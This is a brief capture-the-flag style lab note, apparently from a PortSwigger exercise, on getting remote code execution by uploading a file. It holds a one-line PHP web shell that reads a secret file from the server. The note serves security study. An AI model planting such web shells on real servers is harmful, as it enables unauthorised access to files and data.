# Remote code execution via web shell upload

Source: Portswigger
Tools: Burpsuite
Technique: FIle upload
Fields: Web

- no restriction → upload php file( <?php echo file_get_contents('/home/carlos/secret'); ?> )